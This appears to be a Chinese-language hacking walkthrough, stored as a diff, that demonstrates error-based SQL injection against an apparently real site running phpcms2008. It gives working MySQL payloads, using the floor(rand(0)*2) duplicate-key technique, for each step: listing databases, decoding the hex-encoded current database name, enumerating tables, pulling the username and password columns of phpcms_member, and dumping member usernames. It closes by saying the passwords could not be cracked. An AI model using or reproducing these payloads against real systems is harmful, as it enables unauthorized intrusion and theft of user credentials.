@@ -1,0 +1,27 @@
+ 无乱是and 1=1 1=2都是返回正常页面的
+盲猪也是没戏的 字段19
+网上貌似有介绍都这个注入代码的 
+但是很多测试都没成功
+嘎嘎 这些百度都有 不过很少
+下面我来演示一下 怎么进行 报错注入
+爆所有库
+and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,schema_name,0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+接着下去也是可以查出所有库的
+
+爆当前数据库
+and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,hex(cast(database() as char)),0x27,0x7e)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+415256303332 这个就是hex 当前库的 转换一下看看 ARV032 就是这个
+接着
+暴表
+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,hex(cast(table_name as char)),0x27,0x7e) from information_schema.tables where table_schema=0x415256303332 limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+70687062625F61636C5F67726F757073 还需要转换一下
+phpbb_acl_groups 这个不是 玩个phpcms2008的人都知道 是phpcms_member 这个才对 大家就自已去查询把 只要改一下数字就行了
+爆字段
+and(select 1 from(select count(*),concat((select (select (select distinct concat(0x7e,0x27,column_name,0x27,0x7e) from information_schema.columns where table_schema=0x415256303332 and table_name=0x706870636D735F6D656D626572 limit 0,1)) from
+information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+username password
+爆内容
+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,0x27,phpcms_member.username,0x27,0x7e) from phpcms_member limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) and 1=1
+
+密码破译不出来
